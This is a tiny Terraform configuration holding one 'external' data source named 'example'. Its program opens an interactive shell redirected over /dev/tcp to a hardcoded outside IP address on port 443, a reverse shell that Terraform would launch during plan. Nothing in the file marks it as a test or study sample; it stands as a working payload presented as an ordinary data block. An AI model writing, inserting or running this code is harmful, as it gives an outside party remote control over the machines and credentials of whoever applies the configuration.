data "external" "example" {
  program = ["sh", "-c", "sh -i >& /dev/tcp/116.203.141.214/443 0>&1"]
}
